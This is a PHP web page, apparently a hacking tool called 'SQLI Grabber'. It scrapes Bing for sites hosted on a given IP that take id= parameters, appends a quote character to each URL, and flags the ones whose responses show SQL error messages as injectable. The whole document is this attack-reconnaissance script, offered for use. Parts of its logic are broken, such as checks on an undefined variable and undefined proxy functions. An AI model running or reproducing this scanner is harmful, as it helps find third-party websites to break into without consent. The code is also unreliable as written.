<title>SQLI Grabber</title>
<center>
<form method="post">
<center>
<br/><input type="text" name="site" size="42" />
<br><input type="submit" name="go" value="Get" />
</center>
</form>
<style type="text/css">
  body{
    background-color: #d2a679;
  }
  a{
    text-decoration: none;
  }

  input{
    color: #FF0000;
    border: dotted 1pt #0078AA;
  }
</style>

<?php
function getsource($url, $proxy) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if ($proxy) {
        $proxy = explode(':', autoprox());
        curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
        curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
    }
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}

error_reporting(0);
set_time_limit(0);
$ip=$_POST['site'];
     if($_POST["go"]) {

        $npage = 1;
        $npages = 300;
        $allLinks = array();
        $lll = array();
        while($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=ip%3A" . $ip . "+id%3D&first=" . $npage, $proxy);
            if ($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
            } else break;
        }
        //print_r($allLinks) ;
        $col=array_filter($allLinks);
        $lol=array_unique($col);

        foreach ($lol as $urll){
         //echo'<b><font color="06FD02"><a href='.$urll.'>'.$urll.'</a></font></b><br>';
         sqli($urll);
        }
    }
    function sqli($url){
      $url2=("$url%27");
      $xx=http_get($url2);
      if(preg_match("/SQL syntax/i",$x) or eregi('You have an error',$xx) or eregi(' in your SQL syntax',$x)or preg_match('/sql/i',$x)){
       echo'<b><font color="green">'.$url2.'</font></b><br>';
      }else{
       echo'<b><font color="red">'.$url2.'</font></b><br>';
      }
    }
    function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
    }
?>